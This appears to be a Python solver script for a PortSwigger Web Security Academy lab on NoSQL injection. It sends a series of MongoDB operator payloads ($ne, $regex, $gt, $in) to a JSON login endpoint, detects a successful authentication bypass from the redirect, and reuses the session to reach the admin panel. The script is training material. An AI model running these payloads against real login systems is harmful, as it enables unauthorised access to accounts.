#!/usr/bin/env python3
"""
Exploiting NoSQL operator injection to bypass authentication
PortSwigger Web Security Academy -- NoSQL Injection

Companion script for the writeup: 02-nosql-operator-injection-bypass-authentication.md

What this does:
    Probes the JSON /login endpoint with a sequence of MongoDB operator payloads
    (mirroring the order we actually tried, since the admin username is randomized
    and the double-$ne combination is a known dead end that returns a 500). The
    payload that works combines $regex on username with $ne on password:
    {"username":{"$regex":"admin.*"},"password":{"$ne":""}} -- $regex matches any
    admin-prefixed username without knowing the randomized suffix, and $ne:""
    matches any non-empty password. Redirects are disabled while probing so a 302
    (success) is distinguishable from a 200 (failure) instead of being silently
    followed. Once a payload produces a redirect into an account page, the script
    carries that session into /my-account and /admin to confirm administrator access.

Usage:
    python 02-nosql-operator-injection-bypass-authentication.py <lab-url>

Requirements:
    pip install httpx
"""

import sys
import httpx

PAYLOADS = [
    ("$ne empty", {"username": "administrator", "password": {"$ne": ""}}),
    ("$ne invalid", {"username": "administrator", "password": {"$ne": "invalid"}}),
    ("$regex .*", {"username": "administrator", "password": {"$regex": ".*"}}),
    ("$gt empty", {"username": "administrator", "password": {"$gt": ""}}),
    ("$ne both", {"username": {"$ne": ""}, "password": {"$ne": ""}}),
    ("$regex both", {"username": {"$regex": "admin.*"}, "password": {"$ne": ""}}),
    ("$in admins", {"username": {"$in": ["admin", "administrator", "superadmin"]}, "password": {"$ne": ""}}),
]


def solve(lab_url: str) -> None:
    login_url = f"{lab_url}/login"
    working_cookies = None

    with httpx.Client(follow_redirects=False, timeout=15) as client:
        for name, payload in PAYLOADS:
            r = client.post(login_url, json=payload)
            is_redirect = r.status_code in (301, 302, 303)
            loc = r.headers.get("location", "")
            print(f"  [{'+' if is_redirect else '-'}] {name}: {r.status_code} loc={loc}")
            if is_redirect and "account" in loc.lower():
                print(f"[+] SUCCESS with payload: {name}")
                working_cookies = r.cookies
                break

    if not working_cookies:
        print("[-] No payload produced a redirect into an account page.")
        return

    with httpx.Client(follow_redirects=True, timeout=15, cookies=working_cookies) as client:
        r_acct = client.get(f"{lab_url}/my-account")
        print(f"[*] Account page: {r_acct.status_code}, url={r_acct.url}")

        r_admin = client.get(f"{lab_url}/admin")
        print(f"[*] Admin panel: {r_admin.status_code}")

        check = client.get(lab_url)
        if "Congratulations" in check.text:
            print("[+] Lab solved -- authenticated as administrator via operator injection.")
        else:
            print("[-] Not solved yet -- reached the admin session but the lab hasn't flagged it.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
